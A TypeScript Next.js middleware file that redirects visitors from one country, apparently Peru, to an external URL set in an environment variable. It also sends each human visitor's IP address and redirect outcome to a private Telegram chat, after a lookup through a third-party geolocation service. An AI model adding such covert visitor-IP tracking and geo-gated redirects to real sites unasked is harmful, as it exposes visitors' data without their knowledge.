import { NextRequest, NextResponse } from "next/server";
import { getActiveIso } from "@/lib/market";

const COUNTRY_HEADERS = [
  "x-vercel-ip-country",
  "cf-ipcountry",
  "cloudfront-viewer-country",
  "x-country-code",
  "x-geo-country",
  "x-nf-country",
];

function isLocalIp(ip: string) {
  if (
    ip === "127.0.0.1" ||
    ip === "::1" ||
    ip.startsWith("::ffff:127.") ||
    ip.startsWith("192.168.") ||
    ip.startsWith("10.")
  ) {
    return true;
  }

  const privateBlock = ip.match(/^172\.(\d+)\./);
  if (privateBlock) {
    const octet = Number(privateBlock[1]);
    return octet >= 16 && octet <= 31;
  }

  return false;
}

function clientIp(request: NextRequest): string | null {
  const forwarded = request.headers.get("x-forwarded-for");
  if (forwarded) {
    const ip = forwarded.split(",")[0]?.trim();
    if (ip) return ip;
  }

  const real = request.headers.get("x-real-ip");
  if (real) return real.trim();

  return request.headers.get("x-client-ip");
}

function countryFromHeaders(request: NextRequest): string | null {
  for (const header of COUNTRY_HEADERS) {
    const value = request.headers.get(header);
    if (value && value !== "XX" && value !== "T1") {
      return value.toUpperCase();
    }
  }
  return null;
}

async function lookupCountry(ip: string): Promise<string | null> {
  try {
    const response = await fetch(
      `https://ipwho.is/${encodeURIComponent(ip)}?fields=country_code,success`,
      { cache: "no-store" },
    );

    if (!response.ok) return null;

    const data = (await response.json()) as {
      success?: boolean;
      country_code?: string;
    };

    if (data.success && data.country_code) {
      return data.country_code.toUpperCase();
    }
  } catch {
    return null;
  }

  return null;
}

const PUBLIC_PATHS = ["/terminos-y-condiciones", "/tratamiento-de-datos"];

function safeRedirectUrl(value: string | undefined) {
  const trimmed = value?.trim();
  if (!trimmed) return null;

  try {
    return new URL(trimmed).toString();
  } catch {
    return null;
  }
}

function countryFlag(iso: string | null) {
  if (!iso || !/^[A-Z]{2}$/.test(iso)) return "🏳️";
  return String.fromCodePoint(
    ...[...iso].map((letter) => 127397 + letter.charCodeAt(0)),
  );
}

function isPrefetch(request: NextRequest) {
  return (
    request.headers.get("next-router-prefetch") === "1" ||
    request.headers.get("purpose") === "prefetch" ||
    (request.headers.get("sec-purpose") || "").includes("prefetch")
  );
}

function isBot(request: NextRequest) {
  return /bot|crawl|spider|preview|facebookexternalhit|whatsapp|telegram/i.test(
    request.headers.get("user-agent") || "",
  );
}

async function notifyTelegram(message: string) {
  const token = process.env.TELEGRAM_BOT_TOKEN?.trim();
  const chatId = process.env.TELEGRAM_CHAT_ID?.trim();
  if (!token || !chatId) return;

  try {
    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        disable_web_page_preview: true,
      }),
      cache: "no-store",
      signal: AbortSignal.timeout(1200),
    });
  } catch {
    // Aviso opcional: no debe romper el redirect ni la página.
  }
}

export async function middleware(request: NextRequest) {
  try {
    const pathname = request.nextUrl.pathname;

    if (PUBLIC_PATHS.includes(pathname)) {
      return NextResponse.next();
    }

    const redirectUrl = safeRedirectUrl(process.env.REDIRECT_URL);

    if (!redirectUrl) {
      return NextResponse.next();
    }

    const override = process.env.GEO_COUNTRY_OVERRIDE?.trim().toUpperCase();
    let country: string | null = override || countryFromHeaders(request);
    const ip = clientIp(request);

    if (!country && ip && !isLocalIp(ip)) {
      country = await lookupCountry(ip);
    }

    const redirected = country === getActiveIso();

    if (
      pathname === "/" &&
      request.method === "GET" &&
      ip &&
      !isLocalIp(ip) &&
      !isPrefetch(request) &&
      !isBot(request)
    ) {
      const flag = countryFlag(country);
      const visitor = `${flag} ${ip} (${country || "??"})`;
      const text = redirected
        ? `${visitor}\nPerú — redirigido exitosamente`
        : `${visitor}\nFuera de Perú — se quedó en la página`;
      await notifyTelegram(text);
    }

    if (redirected) {
      return NextResponse.redirect(redirectUrl, 302);
    }

    return NextResponse.next();
  } catch {
    return NextResponse.next();
  }
}

export const config = {
  matcher: [
    "/",
    "/((?!_next/static|_next/image|favicon.ico|icon.svg|robots.txt).*)",
  ],
};
